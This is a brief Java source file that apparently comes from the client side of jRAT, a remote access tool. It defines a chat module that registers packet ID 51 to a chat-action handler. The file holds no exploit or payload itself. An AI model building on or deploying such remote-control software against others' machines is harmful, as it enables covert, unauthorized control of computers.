package jrat.module.chat;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;

public class ChatClientModule extends ClientModule {

    public static FrameChat instance;

    public void init() throws Exception {
        IncomingPackets.register((short) 51, PacketChatAction.class);

    }
}
